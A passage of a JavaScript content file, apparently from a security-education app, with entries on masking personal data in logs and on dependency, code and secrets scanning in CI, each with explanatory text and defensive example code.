// Deterministic pseudonym: same email always maps to the same fake
function pseudonymize(email) {
  const h = crypto.createHmac("sha256", MASK_KEY).update(String(email).toLowerCase()).digest("hex");
  return "user_" + h.slice(0, 12) + "@example.invalid";
}

function maskCard(num) {
  return "**** **** **** " + String(num).replace(/\\D/g, "").slice(-4);
}

// The one serializer every log line goes through
const ALLOWED = new Set(["userId", "orderId", "path", "durationMs", "status"]);
function logEvent(level, msg, fields = {}) {
  const safe = {};
  for (const [k, v] of Object.entries(fields)) {
    if (!ALLOWED.has(k)) continue;                    // default-deny
    safe[k] = typeof v === "string" && v.includes("@") ? pseudonymize(v) : v;
  }
  console.log(JSON.stringify({ ts: new Date().toISOString(), level, msg, ...safe }));
}

logEvent("info", "checkout", { userId: "u42", email: "ada@example.com", card: "4242424242421234" });
// -> {"userId":"u42"}  email/card dropped: not on the allowlist

// Masked non-prod copy of a production row
function maskUserRow(row) {
  return { ...row, email: pseudonymize(row.email), card: row.card ? maskCard(row.card) : null };
}`,
    steps: ["Sensitive field identified", "Masked or redacted", "Safe for logs / staging", "Real value stays protected"],
  },
  {
    id: "auth-vulnscanning",
    cat: "auth",
    title: "Vulnerability Scanning",
    one: "Automated tools that check dependencies and code for known security issues.",
    why: "Your code is maybe 5% of your attack surface — the rest is 1,400 transitive dependencies with their own CVEs. Attackers scan for the known ones continuously; scanning gives you the same list they're using, before they use it.",
    how: "SCA tools (npm audit, Dependabot, Snyk) diff your dependency tree against CVE databases. SAST (CodeQL, semgrep) pattern-scans your code for injection/flaw shapes. Both run in CI on every PR (blocking only high/critical), and scheduled scans catch newly disclosed CVEs in already-merged code.",
    when: "CI on every PR + weekly scheduled scans, with a defined SLA: critical patched in 48h, high in 2 weeks. Expect noise: not every CVE is exploitable in your context — triage with reachability analysis and document accepted risks instead of ignoring reports wholesale.",
    ref: "OWASP",
    subtopics: [
      { name: "SCA — dependencies", detail: "npm audit / pnpm audit in CI; lockfiles make trees reproducible, which makes scans meaningful. Direct vs transitive fixes differ: override/resolutions for the latter." },
      { name: "SAST — your code", detail: "Static analysis for the OWASP shapes: unsanitized input to sinks, hardcoded secrets, unsafe deserialization. Tune rules to kill false positives or the tool gets ignored." },
      { name: "Severity triage", detail: "CVSS base scores ignore context: a prototype-pollution lib only used at build time is not a runtime emergency. Triage on exploitability + reachability, and write down what you accept." },
      { name: "Secrets scanning", detail: "gitleaks/trufflehog on every commit: keys in code leak permanently via git history. Pair detection with an instant rotation runbook." },
    ],
    code: `// package.json scripts: gates that run on every PR
// {
//   "scripts": {
//     "audit:high": "npm audit --audit-level=high",
//     "scan:secrets": "gitleaks detect --no-git -v",
//     "scan:code": "semgrep --config=p/owasp-top-ten --error src/"
//   }
// }

// .github/workflows/security.yml (conceptually):
// on: [pull_request, schedule: [{ cron: "0 6 * * 1" }]]   // PRs + weekly
// steps:
//   - run: npm ci
//   - run: npm audit --audit-level=high      # SCA: known CVEs in the tree
//   - run: gitleaks detect --no-git -v       # secrets in the diff
//   - run: semgrep --config=p/owasp-top-ten --error src/

// Programmatic triage: is the vulnerable path even reachable?
const { execSync } = require("child_process");
function auditFor(pkg) {
  try {
    const out = JSON.parse(execSync("npm audit --json").toString());
    return Object.values(out.vulnerabilities ?? {}).filter((v) => v.name === pkg);
  } catch {
    return []; // clean tree
  }
}

const findings = auditFor("lodash");
for (const f of findings) {
  console.log(JSON.stringify({
    pkg: f.name,
    severity: f.severity,
    via: f.via.map((v) => v.title ?? v),
    fixAvailable: Boolean(f.fixAvailable),
  }));
  // severity critical + fixAvailable -> block merge; else file a dated exception
}`,
    steps: ["Scan dependencies", "Match against CVE database", "Flag known vulnerabilities", "Patch or upgrade"],
  },
];